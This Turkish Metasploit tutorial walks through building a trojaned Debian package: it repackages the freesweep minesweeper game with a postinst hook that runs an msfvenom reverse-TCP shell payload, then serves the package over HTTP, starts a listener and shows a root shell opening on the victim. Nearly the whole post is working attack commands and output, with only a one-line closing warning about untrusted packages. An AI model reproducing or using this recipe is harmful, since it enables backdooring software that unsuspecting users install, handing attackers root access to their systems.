---
draft: false
title: MSF Binary Linux Trojan
linkTitle: MSF Binary Linux Trojan
translationKey: msf-binary-linux-trojan
weight: 210
date: 2017-05-20T13:12:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde trojan dosya oluşturabiliriz.
url: /tr/msf-binary-linux-trojan/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
İstemci taraflı saldırılara örnek olarak bir önceki yazımızda Windows platformu için `.exe` uzantılı bir çalıştırılabilir dosya oluşturmuştuk. Linux işletim sistemlerinin kullandığı tıkla ve çalıştır dosya tiplerinde de dosya oluşturabiliriz. Bu yazıda, `.deb` uzantılı bir dosya oluşturacağız.

Ubuntu işletim sistemini hedef alan bu dosyanın oluşturulması ilk olarak biraz karışık gelebilir ancak adımları teker teker inceleyerek devam ederseniz kavramak daha kolay olacaktır.

Öncelikle, içine payload yerleştireceğimiz bir programa ihtiyacımız var. Örnek olarak “Mine Sweeper” programını kullanalım.

## Paketi indirelim

Paketi `--download-only` parametresiyle indirdiğimizde, işletim sistemimize kurulmayacaktır. Daha sonra indirdiğimiz paketi üzerinde çalışmak üzere oluşturacağımız `/tmp/evil` klasörüne taşıyacağız.

```bash
root@kali:~# apt-get --download-only install freesweep
Reading package lists... Done
Building dependency tree
Reading state information... Done
...snip...
root@kali:~# mkdir /tmp/evil
root@kali:~# mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
root@kali:~# cd /tmp/evil/
root@kali:/tmp/evil#
```

Artık `/tmp/evil` klasörünün içerisinde `freesweep_0.90-1_i386.deb` isimli bir Debian paketimiz var. İndirdiğiniz .deb uzantılı dosyanın ismi ve sürüm numarası farklı olabilir. İsmini `ls` komutuyla kontrol ederek örneklerdeki komutlara o şekilde uygulamalısınız.

## Paketi Açalım

Şimdi bu `.deb` uzantılı paketi, sıkıştırılmış bir dosyayı açmaya benzer şekilde açmamız gerekiyor. Bu paketi aşağıdaki komutla `/tmp/evil` klasörü içinde `work` klasörüne çıkartıyoruz. Ardından, bizim ilave edeceğimiz özelliklerin bulunacağı `DEBIAN` isimli bir klasörü `/tmp/evil/work` klasörü altına oluşturuyoruz.

```bash
root@kali:/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work
root@kali:/tmp/evil# mkdir work/DEBIAN
```

## control Dosyası oluşturalım

Debian klasörünün içerisinde `control` isimli bir dosya oluşturup içerisine aşağıdaki Metni yapıştırıp kaydediyoruz. Dosya içeriği aşağıdaki gibi `cat control` komutuyla kontrol ediyoruz.

**control** dosyası içeriği

```bash
Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works **in **any visual text display - **in **Linux console, **in **an xterm, and **in
 **most text-based terminals currently **in **use.
```

## postinst dosyası oluşturalım

Kurulum sonrası çalışması için ayrıca bir bash script dosyasına daha ihtiyacımız var. Yine yukarıdaki gibi `DEBIAN` klasörü içine `postinst` isimli bir dosya oluşturuyoruz. İçerisine aşağıdaki kod satırlarını yapıştırıyoruz.

**postinst** dosya içeriği

```bash
#!/bin/sh

sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;
```

## Payload Oluşturalım

Şimdi içerisinde zararlı kodların olduğu dosyayı oluşturabiliriz. Bunun için aşağıdaki komutu kullanarak `linux/x86/shell/reverse_tcp` payload modülünü kullanacağız. Komut içerisinde `LHOST` ve `LPORT` olarak verdiğimiz değişkenleri kendiniz belirleyebilirsiniz.

```bash
root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 98 (iteration=0)
x86/shikata_ga_nai chosen with final size 98
Payload size: 98 bytes
Saved as: /tmp/evil/work/usr/games/freesweep_scores
```

## Yeniden paketleme

Artık, `postinst` dosyamızı çalıştırılabilir hale getirip `.deb` paketini derleyebiliriz. Komut sonucunda oluşturulacak `work.deb` paketinin ismini `freesweep.deb` olarak değiştirip Apache Server klasörüne (`/var/www` veya `/var/www/html`) yükleyebiliriz. Artık dosyamız Web sunucuda indirilebilir durumdadır.

```bash
root@kali:/tmp/evil/work/DEBIAN# chmod 755 postinst
root@kali:/tmp/evil/work/DEBIAN# dpkg-deb --build /tmp/evil/work
dpkg-deb: building package `freesweep' in `/tmp/evil/work.deb'.
root@kali:/tmp/evil# mv work.deb freesweep.deb
root@kali:/tmp/evil# cp freesweep.deb /var/www/
```

## Dinleyici Handler Oluşturma

Şimdi, bir tıklama veya çalıştırma ile gelecek bağlantı isteklerini dinlemek için dinleyici oluşturalım. Burada komuta vereceğimiz `LHOST` ve `LPORT` değerleri, payload oluştururken girilen değerler ile aynı olmalıdır.

```bash
root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
PAYLOAD => linux/x86/shell/reverse_tcp
LHOST => 192.168.1.101
LPORT => 443
> Started reverse handler on 192.168.1.101:443
> Starting the payload handler...
```

## Sonuç

Herhangi bir kullanıcı, bu hazırladığımız `freesweep.deb` paketini indirip çalıştırdığında dinleme yapan `exploit/multi/handler` modülümüz hedef bilgisayarda oturum açacaktır.

```bash
ubuntu@ubuntu:~$ wget <a href="http://192.168.1.101/freesweep.deb">http://192.168.1.101/freesweep.deb</a>
ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb

> Sending stage (36 bytes)
> Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.175:1129)

ifconfig
eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
inet addr:192.168.1.175 Bcast:192.168.1.255 Mask:255.255.255.0
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
RX packets:49 errors:0 dropped:0 overruns:0 frame:0
TX packets:51 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:43230 (42.2 KiB) TX bytes:4603 (4.4 KiB)
Interrupt:17 Base address:0x1400
...snip...

hostname
ubuntu
id
uid=0(root) gid=0(root) groups=0(root)
```

## Tavsiye

Görüldüğü gibi zararlı yazılımlar sadece Windows’a özel değildir. Linux kullanıcılarının da tıkla ve çalıştır programlara dikkatle yaklaşması gerekmektedir. Güvenilir olmayan kaynaklardan paket yüklememenizi tavsiye ediyoruz.
